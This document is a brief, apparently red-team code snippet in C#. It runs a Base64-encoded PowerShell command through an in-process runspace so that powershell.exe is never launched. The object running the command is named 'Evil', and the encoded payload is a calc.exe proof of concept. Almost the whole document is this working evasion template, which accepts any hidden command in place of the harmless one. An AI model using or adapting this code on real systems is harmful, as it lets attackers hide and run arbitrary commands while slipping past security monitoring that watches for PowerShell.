
The Base64 Powershell Command execution via C# without having Powershell.exe

```
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace Base64_PS
{
    class Program
    {
        static void Main()
        {
            new Execution().Execution_Main();
        }
    }

    class Execution
    {
        public static string Command = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(@"Y21kLmV4ZSAvYyBjYWxjLmV4ZQ==")); //cmd.exe /c calc.exe

        public void Execution_Main()
        {
            InitialSessionState p = InitialSessionState.CreateDefault();
            Runspace rspace = RunspaceFactory.CreateRunspace(p);
            rspace.Open();
            PowerShell Evil = PowerShell.Create();
            Evil.Runspace = rspace;
            Evil.AddScript(Command);
            Evil.Invoke();
            rspace.Close();
        }
    }
}

```
